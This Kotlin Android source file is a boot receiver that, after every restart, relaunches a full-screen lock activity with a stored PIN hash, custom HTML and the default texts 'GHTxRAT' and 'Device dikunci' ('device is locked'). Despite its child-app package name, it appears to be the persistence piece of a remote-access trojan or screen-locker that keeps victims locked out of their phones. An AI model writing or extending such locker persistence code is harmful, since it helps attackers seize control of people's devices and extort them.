package com.rifxguard.child

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action != Intent.ACTION_BOOT_COMPLETED) return
        val prefs = context.getSharedPreferences(LockActivity.PREFS, Context.MODE_PRIVATE)
        if (!prefs.getBoolean(LockActivity.KEY_ACTIVE, false)) return
        val i = Intent(context, LockActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        i.putExtra(LockActivity.EXTRA_TITLE, prefs.getString("title", "GHTxRAT"))
        i.putExtra(LockActivity.EXTRA_MESSAGE, prefs.getString("message", "Device dikunci"))
        i.putExtra(LockActivity.EXTRA_PIN_HASH, prefs.getString("pinHash", ""))
        i.putExtra(LockActivity.EXTRA_HTML, prefs.getString("html", ""))
        context.startActivity(i)
    }
}
